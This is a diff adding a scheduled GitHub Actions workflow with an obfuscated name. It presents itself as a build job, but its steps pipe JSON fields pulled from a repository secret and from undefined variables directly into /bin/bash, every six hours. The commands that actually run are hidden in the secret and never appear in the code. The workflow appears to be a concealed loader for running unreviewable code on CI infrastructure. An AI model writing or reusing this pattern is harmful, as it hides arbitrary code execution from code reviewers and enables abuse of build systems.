@@ -1,0 +1,22 @@
+name: liangshuxi2361
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liangshuxi2361
+        env:
+          g7192: ${{ secrets.g7192 }}
+        run: |
+          echo $g7192 | jq -r .b09 | /bin/bash
+          echo $qx90246 | jq -r .vzj5 | /bin/bash
+          echo $poog7656 | jq -r .ig4 | /bin/bash
+          echo $t97 | jq -r .wvmd616 | /bin/bash
+
